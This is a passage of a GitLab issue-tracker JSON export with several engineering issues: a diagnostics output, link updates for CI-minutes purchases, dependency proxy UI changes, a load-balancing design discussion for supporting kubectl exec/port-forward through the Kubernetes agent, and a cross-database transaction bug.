...\n\nGit configured correctly? ... yes\nDatabase config exists? ... yes\nAll migrations up? ... yes\nDatabase contains orphaned GroupMembers? ... no\nGitLab config exists? ... yes\nGitLab config up to date? ... yes\nLog directory writable? ... yes\nTmp directory writable? ... yes\nUploads directory exists? ... yes\nUploads directory has correct permissions? ... yes\nUploads directory tmp has correct permissions? ... skipped (no tmp uploads folder yet)\nInit script exists? ... skipped (omnibus-gitlab has no init script)\nInit script up-to-date? ... skipped (omnibus-gitlab has no init script)\nProjects have namespace: ...\n3/6 ... yes\n3/7 ... yes\n3/15 ... yes\n3/16 ... yes\n3/24 ... yes\n3/25 ... yes\n3/32 ... yes\n36/33 ... yes\n3/34 ... yes\n8/35 ... yes\n3/36 ... yes\n3/37 ... yes\n3/38 ... yes\n3/39 ... yes\n3/41 ... yes\n70/42 ... yes\n3/43 ... yes\n16/44 ... yes\n18/45 ... yes\n18/46 ... yes\n18/47 ... yes\n23/49 ... yes\n23/50 ... yes\n23/51 ... yes\n3/56 ... yes\n34/57 ... yes\n3/60 ... yes\n42/61 ... yes\n45/62 ... yes\n51/65 ... yes\n51/66 ... yes\n51/67 ... yes\n51/68 ... yes\n51/69 ... yes\n55/71 ... yes\n119/72 ... yes\n55/73 ... yes\n55/74 ... yes\n55/75 ... yes\n55/76 ... yes\n55/77 ... yes\n55/78 ... yes\n3/79 ... yes\n3/80 ... yes\n3/81 ... yes\n3/82 ... yes\n3/83 ... yes\n59/87 ... yes\n55/88 ... yes\n53/89 ... yes\n28/91 ... yes\n51/92 ... yes\n51/94 ... yes\n119/95 ... yes\n3/96 ... yes\n3/97 ... yes\n51/98 ... yes\n77/100 ... yes\n3/101 ... yes\n3/104 ... yes\n3/105 ... yes\n3/106 ... yes\n3/107 ... yes\n3/109 ... yes\n3/110 ... yes\n3/111 ... yes\n77/112 ... yes\n3/113 ... yes\n119/114 ... yes\n119/115 ... yes\n3/116 ... yes\n3/117 ... yes\n3/118 ... yes\n47/119 ... yes\n3/120 ... yes\n3/121 ... yes\n36/122 ... yes\n84/123 ... yes\n3/126 ... yes\n3/127 ... yes\n3/128 ... yes\n3/129 ... yes\n3/130 ... yes\n3/131 ... yes\n3/132 ... yes\n3/133 ... yes\n3/136 ... yes\n3/137 ... yes\n3/138 ... yes\n3/139 ... yes\n88/140 ... yes\n88/142 ... yes\n3/143 ... yes\n93/145 ... yes\n93/148 ... yes\n3/149 ... yes\n3/150 ... yes\n88/151 ... yes\n3/152 ... yes\n102/153 ... yes\n102/157 ... yes\n102/158 ... yes\n51/159 ... yes\n102/160 ... yes\n3/161 ... yes\n3/162 ... yes\n77/164 ... yes\n3/165 ... yes\n3/166 ... yes\n3/167 ... yes\n113/168 ... yes\n3/170 ... yes\n3/171 ... yes\n50/172 ... yes\n3/173 ... yes\n119/174 ... yes\n3/175 ... yes\n102/176 ... yes\n23/177 ... yes\n3/178 ... yes\n65/179 ... yes\n102/180 ... yes\n3/181 ... yes\n102/182 ... yes\n119/183 ... yes\n119/184 ... yes\n3/185 ... yes\n131/186 ... yes\n102/187 ... yes\n3/188 ... yes\n3/189 ... yes\n3/190 ... yes\n88/191 ... yes\n3/192 ... yes\n3/193 ... yes\n47/194 ... yes\n143/196 ... yes\n143/197 ... yes\n143/198 ... yes\n3/199 ... yes\n51/200 ... yes\nRedis version \u003e= 5.0.0? ... yes\nRuby version \u003e= 2.7.2 ? ... yes (2.7.4)\nGit version \u003e= 2.33.0 ? ... yes (2.33.0)\nGit user has default SSH configuration? ... yes\nActive users: ... 112\nIs authorized keys file accessible? ... yes\nGitLab configured to store new projects in hashed storage? ... yes\nAll projects are in hashed storage? ... yes\n\nChecking GitLab App ... Finished\n\n\nChecking GitLab subtasks ... Finished\n\u003c/pre\u003e\n\u003c/details\u003e\n\n### Possible fixes\n\n\u003c!-- If you can, link to the line of code that might be responsible for the problem. --\u003e","state":"closed","created_at":"2021-11-22T13:27:01.436Z","updated_at":"2022-12-08T17:46:46.577Z","closed_at":"2022-04-12T17:26:06.184Z","closed_by":{"id":3029776,"username":"shampton","name":"Scott Hampton","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3029776/avatar.png","web_url":"https://gitlab.com/shampton"},"labels":["CI artifacts","Category:Build Artifacts","Verify::P1","customer","devops::verify","group::pipeline insights","priority::2","section::ops","severity::2","type::bug","workflow::production"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":6354882,"username":"alberts-gitlab","name":"Albert Salim","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6354882/avatar.png","web_url":"https://gitlab.com/alberts-gitlab"}],"author":{"id":1823696,"username":"l.scorcia","name":"Luca Leonardo Scorcia","state":"active","avatar_url":"https://secure.gravatar.com/avatar/28b3eac517d28dce4e6821daf6fa1438?s=80\u0026d=identicon","web_url":"https://gitlab.com/l.scorcia"},"type":"ISSUE","assignee":{"id":6354882,"username":"alberts-gitlab","name":"Albert Salim","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6354882/avatar.png","web_url":"https://gitlab.com/alberts-gitlab"},"user_notes_count":180,"merge_requests_count":0,"upvotes":43,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346261","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346261","notes":"https://gitlab.com/api/v4/projects/278964/issues/346261/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346261/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346261","relative":"#346261","full":"gitlab-org/gitlab#346261"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7097,"epic":{"id":381726,"iid":7097,"title":"Improve expire_at behavior for self hosted GitLab instances so wanted artifacts are not deleted","url":"/groups/gitlab-org/-/epics/7097","group_id":9970,"human_readable_end_date":"Apr 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97728607,"iid":346251,"project_id":278964,"title":"Update links to /buy_ci_minutes in GitLab","description":"We have 3 cases where we link to CustomersDot /buy_ci_minutes route. We would like to exchange it with links to the GitLab purchase.\n\n| Case | Screenshot |\n| ------ | ------ |\n| [notify email](https://gitlab.com/gitlab-org/gitlab/blob/master/ee/app/views/ci_minutes_usage_mailer/notify.html.haml) | ![Screenshot_2021-11-22_at_11.32.04](/uploads/c91b4da6fd0b06573706cdc25beadab3/Screenshot_2021-11-22_at_11.32.04.png) |\n| [notify limit email](https://gitlab.com/gitlab-org/gitlab/blob/master/ee/app/views/ci_minutes_usage_mailer/notify_limit.html.haml) | ![Screenshot_2021-11-22_at_11.32.11](/uploads/73cec073539e51949433009a47415c49/Screenshot_2021-11-22_at_11.32.11.png) |\n| [Shared runners alert](https://gitlab.com/gitlab-org/gitlab/blob/master/ee/app/views/shared/_shared_runners_minutes_limit.html.haml) | Buy more Pipeline minutes link ![Screenshot_2021-11-24_at_09.56.37](/uploads/e20e17f23790d44ca79d665bc4ad967f/Screenshot_2021-11-24_at_09.56.37.png) |","state":"closed","created_at":"2021-11-22T10:40:36.201Z","updated_at":"2022-01-18T07:02:43.659Z","closed_at":"2022-01-07T12:28:51.524Z","closed_by":{"id":9299375,"username":"dzubova","name":"Diana Zubova","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9299375/avatar.png","web_url":"https://gitlab.com/dzubova"},"labels":["Category:Purchase","Deliverable","auto updated","devops::fulfillment","frontend","group::purchase","section::fulfillment","workflow::production"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":9299375,"username":"dzubova","name":"Diana Zubova","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9299375/avatar.png","web_url":"https://gitlab.com/dzubova"}],"author":{"id":9299375,"username":"dzubova","name":"Diana Zubova","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9299375/avatar.png","web_url":"https://gitlab.com/dzubova"},"type":"ISSUE","assignee":{"id":9299375,"username":"dzubova","name":"Diana Zubova","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9299375/avatar.png","web_url":"https://gitlab.com/dzubova"},"user_notes_count":11,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346251","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346251","notes":"https://gitlab.com/api/v4/projects/278964/issues/346251/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346251/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346251","relative":"#346251","full":"gitlab-org/gitlab#346251"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6574,"epic":{"id":327000,"iid":6574,"title":"Move CI Minutes purchase flows to GitLab.com UI (Group namespaces only)","url":"/groups/gitlab-org/-/epics/6574","group_id":9970,"human_readable_end_date":"Dec 10, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97726857,"iid":346249,"project_id":278964,"title":"When dependency proxy is disabled for the group hide the page","description":"When the dependency proxy is disabled at the group level we should:\n\n- Hide the menu entry\n- Display a 404 if the page is reached by inputting the url\n- Remove the ~frontend banner that informs that the page is disabled\n\nThe following discussion from !74806 should be addressed:\n\n- [ ] @katiemacoy started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74806#note_737679176):  (+4 comments)\n\n    \u003e **Blocking question**\n    \u003e \n    \u003e In https://gitlab.com/gitlab-org/gitlab/-/issues/342685 the dependency proxy menu entry was removed when user can't access the page. \n    \u003e \n    \u003e Looking at this MR I don't see this happening.\n    \u003e | Expected behaviour | Actual behaviour |\n    \u003e | ------ | ------ |\n    \u003e | If I enter a group where the Dependency Proxy is disabled, there is **no** Dependency Proxy menu item | If I enter a group where the Dependency Proxy is disabled, there is a Dependency Proxy menu item |\n    \u003e \n    \u003e ![Screen_Recording_2021-11-19_at_01.57.10_PM](/uploads/ba5ceccf40c7e24059ad0fa8b040b8db/Screen_Recording_2021-11-19_at_01.57.10_PM.gif)","state":"closed","created_at":"2021-11-22T10:19:58.986Z","updated_at":"2021-12-13T12:47:06.897Z","closed_at":"2021-12-13T12:47:06.881Z","closed_by":{"id":4584738,"username":"nmezzopera","name":"Nicolò Maria Mezzopera","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4584738/avatar.png","web_url":"https://gitlab.com/nmezzopera"},"labels":["Category:Dependency Proxy","UX","UX debt","auto updated","backend","devops::package","frontend","group::package registry","section::ops","severity::4","type::bug","workflow::in review"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":4584738,"username":"nmezzopera","name":"Nicolò Maria Mezzopera","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4584738/avatar.png","web_url":"https://gitlab.com/nmezzopera"}],"author":{"id":4584738,"username":"nmezzopera","name":"Nicolò Maria Mezzopera","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4584738/avatar.png","web_url":"https://gitlab.com/nmezzopera"},"type":"ISSUE","assignee":{"id":4584738,"username":"nmezzopera","name":"Nicolò Maria Mezzopera","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4584738/avatar.png","web_url":"https://gitlab.com/nmezzopera"},"user_notes_count":3,"merge_requests_count":0,"upvotes":2,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346249","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346249","notes":"https://gitlab.com/api/v4/projects/278964/issues/346249/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346249/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346249","relative":"#346249","full":"gitlab-org/gitlab#346249"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97726794,"iid":346248,"project_id":278964,"title":"[Meta] Support kubectl exec/attach/cp/port-forward","description":"# Release notes\n\nUntil now, users of the agent for Kubernetes had to work around limitations of the CI/CD workflow not supporting `kubectl exec/attach/cp/port-forward` calls. GitLab now supports these calls on top of SPDY protocol. If your load balancer or reverse proxy supports SPDY, you can use `kubectl exec/attach/cp/port-forward` with CI/CD workflows. Both the GitLab Charts and Omnibus use Nginx and are configured to support SPDY out of the box.\n\nUnfortunately, we already know that at least some cloud providers do not support SPDY. We are working with the [Kubernetes community to ship Websockets support](https://github.com/kubernetes/kubernetes/pull/110142) in Kubernetes, which will be the solution for many cloud-hosted GitLab instances, including GitLab SaaS.\n\n# Current state\n\n- agentk can connect to kas via WebSockets or via gRPC directly. WebSockets can be used to wrap the actual gRPC traffic to make it possible to use HTTP load balancers and/or reverse proxies that cannot proxy gRPC or HTTP/2.\n- On GitLab.com agentk connects to kas via WebSockets (`wss://kas.gitlab.com`). [We did it this way](https://gitlab.com/gitlab-org/gitlab/-/issues/276097) because it was faster (fewer unknowns) and because there was no mechanism for managing (rotating?) TLS certs (or secrets?) in GitLab.com deployment to Kubernetes. Don't remember now, something like that.\n- Chart [always uses WebSockets](https://gitlab.com/gitlab-org/charts/gitlab/-/blob/282db8b5a02b1682048aac692e387849459b81e0/charts/gitlab/charts/kas/templates/_default-config.yaml#L4).\n- Omnibus still [doesn't use a separate domain for kas](https://gitlab.com/gitlab-org/omnibus-gitlab/-/issues/5784). kas' traffic is accepted on the same domain, just a separate URL path. I.e. it uses WebSockets too.\n\n# Issues with current state\n\n- [CI tunnel](https://docs.gitlab.com/ee/user/clusters/agent/ci_cd_workflow.html) does not support exec/attach/cp/port-forward `kubectl` commands because they use SPDY (was discovered in https://gitlab.com/gitlab-org/cluster-integration/gitlab-agent/-/issues/186). SPDY uses [HTTP `Upgrade` mechanism](https://httpwg.org/specs/rfc7230.html#header.upgrade) to upgrade the connection from HTTP/1.1. GKE's HTTP load balancer that we use supports WebSocket connection upgrades only, not the long deprecated SPDY i.e. **the current load balancer cannot pass SPDY traffic**. It seems that we need a TCP load balancer.\n- Encapsulating gRPC traffic in a WebSocket connection **adds extra moving parts on the client and the server side**. Ideally long term we'd use gRPC directly. This is not urgent, but since we are looking at load balancing anyway (to unblock solving the above issue), it's worth keeping in mind too.\n\n# Options to address the above issues\n\nOptions A and B presented below require a TCP load balancer because an HTTP GKE load balancer does not support SPDY upgrades. What would also work is a TLS+TCP load balancer (i.e. a load balancer that terminates TLS and passes cleartext TCP to the backend), but I don't see that in the docs. Using a TCP load balancer means terminating TLS at the backend (kas), which means we cannot use Google-managed TLS certs which is unfortunate.\n\nAnother thing to keep in mind is that we cannot ask all agent users to change the kas URL that their agents use on a certain date (e.g. when %\"15.0\" is released). Even as a breaking change it's too much. We should provide a way for users to migrate to gRPC at their own pace. We could set a removal date (e.g. 16.0) but before deprecating WebSockets we need to ensure Omnibus and Chart are compatible with gRPC-only mode. Because of this, options below support WebSockets and gRPC simultaneously without breaking anyone.\n\nDocs for GKE load balancing:\n- GKE docs (use navigation on the left side): https://cloud.google.com/kubernetes-engine/docs/how-to/service-parameters\n- GCP load balancing docs: https://cloud.google.com/load-balancing/docs\n\nAll options require finishing [connection upgrade support](https://gitlab.com/gitlab-org/cluster-integration/gitlab-agent/-/merge_requests/632) in kas.\n\n## Option A - same domain for gRPC and HTTP traffic\n\nA single domain, such as `kas.gitlab.com` for GitLab.com deployment, that accepts all traffic:\n\n- `wss://kas.gitlab.com/` for compatibility with existing agents (i.e. WebSocket traffic).\n- `grpcs://kas.gitlab.com` for direct gRPC traffic from agents.\n- `https://kas.gitlab.com/some-path/k8s-proxy/` for Kubernetes traffic proxying for [CI tunnel](https://docs.gitlab.com/ee/user/clusters/agent/ci_cd_workflow.html) and other future features. SPDY is handled here.\n\nTCP load balancer is required to pass gRPC, WebSocket (for migration duration), and SPDY traffic.\n\n### Work required\n\n- users: switch to a new URL before the old one stops working in e.g. a year. No rush, no breakage.\n- kas: add a new listen port and implement traffic sniffing on it - accept TCP connection, unwrap TLS, look at the first line. HTTP/2 uses a [fixed client preface](https://httpwg.org/specs/rfc7540.html#rfc.section.3.5) that is a valid (?) HTTP/1.1 request's first line. kas could read it and, depending on what it got, pass the accepted connection to either the gRPC server or HTTP server. HTTP server could route the request based on URL path in the request (WebSocket agent traffic vs Kubernetes API reverse proxy).\n- Chart: support TCP load balancing and TLS termination in kas.\n- Omnibus: support TCP load balancing and TLS termination in kas.\n- GitLab.com infra:\n  - provision a new load balancer working in TCP mode, once new kas is deployed, test that everything works, then switch DNS record to point at the new load balancer. Old load balancer will keep working as kas will be accepting traffic on both old and new ports simultaneously, no disruption to clients and everything can be safely rolled back.\n  - Remove old load balancer once everything is rolled out.\n\n### Pros\n\n- Conceptually simple from user's point of view. A singe domain for all Kubernetes/kas things.\n- Single domain is easier to manage than two. One cert vs two, etc. I can imagine this is a big deal for our self-managed users.\n- Migration to gRPC from WebSockets without any breakage.\n\n### Cons\n\n- Traffic sniffing can be considered a hack :smile: I don't think it's a big deal in this case because we are essentially just trying to understand if it's an HTTP/2 or HTTP/1.1 connection.\n- Not using managed TLS certs.\n- Extra complexity in Chart and Omnibus to handle TCP load balancing and certs.\n\n### Unknowns\n\n- How hard is it to get certs working in Chart and Omnibus?\n- How hard is it to get TCP load balancer working in our GitLab.com instance?\n- ?\n\n## Option B - separate domains for gRPC and HTTP traffic\n\nTwo domains - one for gRPC traffic and another one for HTTP/WebSocket.\n\n- `wss://kas.gitlab.com/` for compatibility with existing agents (i.e. WebSocket traffic).\n- **`grpcs://kas-grpc.gitlab.com`** for direct gRPC traffic from agents.\n- `https://kas.gitlab.com/some-path/k8s-proxy/` for Kubernetes traffic proxying for [CI tunnel](https://docs.gitlab.com/ee/user/clusters/agent/ci_cd_workflow.html) and other future features. SPDY is handled here.\n\nWe cannot use separate ports on the same domain because Kubernetes `Ingress` doesn't support that.\n\n### Work required\n\n- users: switch to a new URL before the old one stops working in e.g. a year. No rush, no breakage.\n- kas: Need to support handling WebSocket vs Kubernetes API proxying requests based on a URL path on a single port (currently two ports).\n- Chart: support TCP load balancing and TLS termination in kas.\n- Omnibus: support TCP load balancing and TLS termination in kas.\n- GitLab.com infra: \n  - provision a new load balancer working in TCP mode, once new kas is deployed, test that everything works, then switch DNS record to point at the new load balancer. Old load balancer will keep working, pointed at the same backend port. No disruption to clients and everything can be safely rolled back.\n  - provision a new load balancer working in HTTP/2 to the backend mode. This one is for gRPC. Point it at the gRPC port.\n  - Remove old load balancer once everything is rolled out.\n\n### Pros\n\n- Migration to gRPC from WebSockets without any breakage.\n\n### Cons\n\n- Not using managed TLS certs.\n- Extra complexity in Chart and Omnibus to handle TCP load balancing and certs.\n\n### Unknowns\n\n- How hard is it to get certs working in Chart and Omnibus?\n- How hard is it to get TCP load balancer working in our GitLab.com instance?\n- ?\n\n## Option C\n\n[Implement WebSocket support in `kubectl`](https://github.com/kubernetes/kubernetes/issues/89163) for commands that rely on SPDY today.\n\n### Work required\n\n- Users: upgrade to `kubectl` with the change, once released. Other tools that use client-go need to pick up the change too to benefit (I'm not sure what those tools are, these bit of code are probably not used by other tools). No other changes needed, things just start to work as they should. Migration to gRPC can be done later by using an additional domain with a load balancer in \"HTTP/2 to the backend\" mode.\n- Kubernetes: There is a [draft PR](https://github.com/kubernetes/kubernetes/pull/107125) that implements WebSocket support, it even got reviewed. To implement this option we'd need to pick this up, make it work well, pass reviews, and get it merged. @ash2k looked at the code and it needs work. The approach used in the PR will enable `attach`, `exec`, `cp` commands as they use the same underlying piece of code. `port-forward` is a separate story and the PR does not do anything for it. It will likely be more complicated.\n- kas: route agent vs Kubernetes API proxy traffic based on URL path.\n\n### Pros\n\n- Fixes the issue once and for all.\n- No need for load balancer changes to resolve this issue.\n\n### Cons\n\n- Getting such a change merged can take quite some time.\n- A single HTTP-mode load balancer does not support gRPC and WebSockets simultaneously as when the load balancer is in HTTP/2 to the backend mode, it cannot accept WebSocket connections (and vice versa). The [docs say `HTTP/2 is not supported` in the WebSockets section](https://cloud.google.com/load-balancing/docs/https/#websocket_support). So not clear how to migrate to gRPC in this scenario when the load balancer is in HTTP/1 to the backend so that it works with WebSockets.\n\n## Option D (B + C)\n\nImplement WebSocket support in `kubectl` and use two domains - one for WebSockets and Kubernetes proxying and another one for gRPC agent connections.\n\n# Proposal\n\nGo with option C and then maybe extend it into option D. More details below in https://gitlab.com/gitlab-org/gitlab/-/issues/346248#note_932802961.\n\n- [x] Finish https://gitlab.com/gitlab-org/cluster-integration/gitlab-agent/-/merge_requests/632 to be ready for WebSocket support in `kubectl`.\n- [ ] [Change kubectl exec/attach/cp to use WebSocket protocol](https://gitlab.com/gitlab-org/gitlab/-/issues/361601).\n- [ ] [Change kubectl port-forward to use WebSocket protocol](https://gitlab.com/gitlab-org/gitlab/-/issues/361602).","state":"closed","created_at":"2021-11-22T10:19:23.542Z","updated_at":"2022-11-15T11:34:45.314Z","closed_at":"2022-10-19T02:23:51.477Z","closed_by":{"id":4855585,"username":"ash2k","name":"Mikhail Mazurskiy","state":"active","avatar_url":"https://secure.gravatar.com/avatar/a3161684bd29f5016064a6c16ccd3bc7?s=80\u0026d=identicon","web_url":"https://gitlab.com/ash2k"},"labels":["Category:Kubernetes Management","Deliverable","GitLab Free","blocked","customer","delivery-direction","devops::configure","documentation","group::configure","internal customer","missed-deliverable","missed:15.1","release post item::in review","section::ops","type::feature","workflow::in dev"],"milestone":{"id":2453027,"iid":77,"group_id":9970,"title":"15.5","description":"","state":"active","created_at":"2022-02-03T22:29:56.909Z","updated_at":"2022-02-03T22:29:56.909Z","due_date":"2022-10-17","start_date":"2022-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/77"},"assignees":[{"id":4855585,"username":"ash2k","name":"Mikhail Mazurskiy","state":"active","avatar_url":"https://secure.gravatar.com/avatar/a3161684bd29f5016064a6c16ccd3bc7?s=80\u0026d=identicon","web_url":"https://gitlab.com/ash2k"}],"author":{"id":4545061,"username":"nagyv-gitlab","name":"Viktor Nagy (GitLab)","state":"active","avatar_url":"https://secure.gravatar.com/avatar/fb255c1e9c228b9356af165939b3ac9b?s=80\u0026d=identicon","web_url":"https://gitlab.com/nagyv-gitlab"},"type":"ISSUE","assignee":{"id":4855585,"username":"ash2k","name":"Mikhail Mazurskiy","state":"active","avatar_url":"https://secure.gravatar.com/avatar/a3161684bd29f5016064a6c16ccd3bc7?s=80\u0026d=identicon","web_url":"https://gitlab.com/ash2k"},"user_notes_count":46,"merge_requests_count":0,"upvotes":20,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346248","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":3,"completed_count":1},"weight":3,"blocking_issues_count":3,"has_tasks":true,"task_status":"1 of 3 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346248","notes":"https://gitlab.com/api/v4/projects/278964/issues/346248/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346248/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346248","relative":"#346248","full":"gitlab-org/gitlab#346248"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5528,"epic":{"id":217347,"iid":5528,"title":"CI/CD tunnel","url":"/groups/gitlab-org/-/epics/5528","group_id":9970,"human_readable_end_date":"Dec 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97722913,"iid":346246,"project_id":278964,"title":"Enhance CI pipeline logger with instrumentation SQL capabilities","description":"We've added the logger in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/72996 but it's limited to time measurements. It would be nice to also capture the SQL statements executed from the instrumentation blocks. We know N+1 problems exist, and this would allow us to measure their severity and help us avoid adding additional N+1s\n\n## Proposed solution\n\nSee https://gitlab.com/gitlab-org/gitlab/-/issues/346246#note_740028637","state":"closed","created_at":"2021-11-22T09:35:00.202Z","updated_at":"2022-01-11T15:36:26.121Z","closed_at":"2022-01-05T10:20:16.747Z","closed_by":{"id":731181,"username":"mbobin","name":"Marius Bobin","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c0a726d6aa37d780309f7b3ea3555a14?s=80\u0026d=identicon","web_url":"https://gitlab.com/mbobin"},"labels":["Category:Continuous Integration","Engineering Allocation","devops::verify","group::pipeline execution","section::ops","type::maintenance","workflow::production"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":731181,"username":"mbobin","name":"Marius Bobin","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c0a726d6aa37d780309f7b3ea3555a14?s=80\u0026d=identicon","web_url":"https://gitlab.com/mbobin"}],"author":{"id":731181,"username":"mbobin","name":"Marius Bobin","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c0a726d6aa37d780309f7b3ea3555a14?s=80\u0026d=identicon","web_url":"https://gitlab.com/mbobin"},"type":"ISSUE","assignee":{"id":731181,"username":"mbobin","name":"Marius Bobin","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c0a726d6aa37d780309f7b3ea3555a14?s=80\u0026d=identicon","web_url":"https://gitlab.com/mbobin"},"user_notes_count":14,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346246","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346246","notes":"https://gitlab.com/api/v4/projects/278964/issues/346246/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346246/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346246","relative":"#346246","full":"gitlab-org/gitlab#346246"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97710626,"iid":346236,"project_id":278964,"title":"destroy_security_findings in EE::Ci::JobArtifacts::DestroyBatchService causes CrossDatabaseModificationAcrossUnsupportedTablesError","description":"Per\nhttps://docs.gitlab.com/ee/development/database/multiple_databases.html#removing-cross-database-transactions\nwe do not allow you to write to 2 different databases within the context of a\nsingle transaction.\n\n\nCurrently this is happening when deleting job artifacts in batch at https://gitlab.com/gitlab-org/gitlab/-/blob/82398ffa5f317227a001c0c92a4b8fe8b8496713/ee/app/services/ee/ci/job_artifacts/destroy_batch_service.rb#L13.\n\n## How to test this\n\n~This failure has been added to either [`spec/support/database/cross-database-modification-allowlist.yml`](https://gitlab.com/gitlab-org/gitlab/-/blob/master/spec/support/database/cross-database-modification-allowlist.yml) or an explicit `allow_cross_database_modification_within_transaction` has been wrapped around the offending code. Removing the corresponding allowlist item and running any RSpec test that executes this code path should reveal the problem.~\n\n- Comment out the `allow_cross_database_modification_within_transaction` in `ee/app/services/ee/ci/job_artifacts/destroy_batch_service.rb`\n- Run `bin/rspec spec/models/ci/job_artifact_spec.rb`\n\n## How to fix this\n\n~This should be possible to fix this just the same as https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74583 by moving `destroy_security_findings` into `after_batch_destroy_hook`.~\n\nTBC\n\nSee possible solutions for this at https://docs.gitlab.com/ee/development/database/multiple_databases.html#removing-cross-database-transactions . \n\nYou may also be able to [search for fixes to similar 